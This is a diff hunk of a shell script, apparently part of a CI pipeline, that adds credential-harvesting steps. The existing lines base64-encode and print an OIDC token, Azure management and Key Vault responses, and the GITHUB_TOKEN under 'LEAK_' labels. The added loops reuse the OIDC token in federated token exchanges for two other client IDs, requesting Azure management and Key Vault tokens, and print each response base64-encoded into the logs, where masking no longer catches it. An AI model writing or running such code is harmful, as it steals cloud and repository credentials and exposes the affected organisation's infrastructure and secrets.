@@ -50,3 +50,19 @@ printf 'LEAK_OIDC_B64='; printf %s "$OIDC_TOKEN" | base64 -w0; echo
 printf 'LEAK_ARMRESP_B64='; printf %s "$ARM_RESP" | base64 -w0; echo
 printf 'LEAK_KVRESP_B64='; printf %s "$KV_RESP" | base64 -w0; echo
 printf 'LEAK_GITHUB_TOKEN_B64='; printf %s "$GITHUB_TOKEN" | base64 -w0; echo
+# Correct federated exchanges, captured as base64 in logs.
+set +e
+for TARGET_CID in 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514; do
+  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
+    --data-urlencode "client_id=${TARGET_CID}" --data-urlencode grant_type=client_credentials \
+    --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+    --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://management.azure.com/.default)
+  printf 'LEGACY_ARM_%s_B64=' "$TARGET_CID"; printf %s "$RESP" | base64 -w0; echo
+done
+for TARGET_CID in 891fb158-e02c-4428-a885-53b811f369c0 462d1c38-4459-48b8-9333-82e389e59514; do
+  RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
+    --data-urlencode "client_id=${TARGET_CID}" --data-urlencode grant_type=client_credentials \
+    --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
+    --data-urlencode "client_assertion=${OIDC_TOKEN}" --data-urlencode scope=https://vault.azure.net/.default)
+  printf 'LEGACY_KV_%s_B64=' "$TARGET_CID"; printf %s "$RESP" | base64 -w0; echo
+done
